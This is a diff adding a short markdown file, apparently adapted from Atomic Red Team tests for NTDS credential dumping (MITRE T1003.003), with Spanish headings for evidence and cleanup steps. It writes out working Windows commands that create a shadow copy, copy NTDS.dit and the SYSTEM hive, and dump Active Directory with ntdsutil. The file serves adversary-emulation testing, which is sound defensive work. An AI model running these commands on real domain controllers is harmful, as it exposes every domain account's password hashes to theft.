@@ -1,0 +1,35 @@
+################T1003.003.md ################
+
+##Atomic Test #1 - Create Volume Shadow Copy with vssadmin
+
+```reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT```
+```vssadmin.exe create shadow /for=C:```
+
+##Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy
+
+```copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit```
+```copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE```
+```reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE```
+
+##Evidencia
+```dir C:\Windows\Temp\```
+
+#Borrado
+```del "C:\Windows\Temp\ntds.dit" >nul 2> nul```
+```del "C:\Windows\Temp\VSC_SYSTEM_HIVE" >nul 2> nul```
+```del "C:\Windows\Temp\SYSTEM_HIVE" >nul 2> nul```
+
+```PAUSE```
+
+##Atomic Test #3 - Dump Active Directory Database with NTDSUtil
+
+```md C:\Windows\Temp\ntds_T1003```
+```ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q```
+
+##Evidencia
+```dir C:\Windows\Temp\```
+
+#Borrado
+```rmdir /q /s C:\Windows\Temp\ntds_T1003 >nul 2>&1```
+
+```PAUSE```
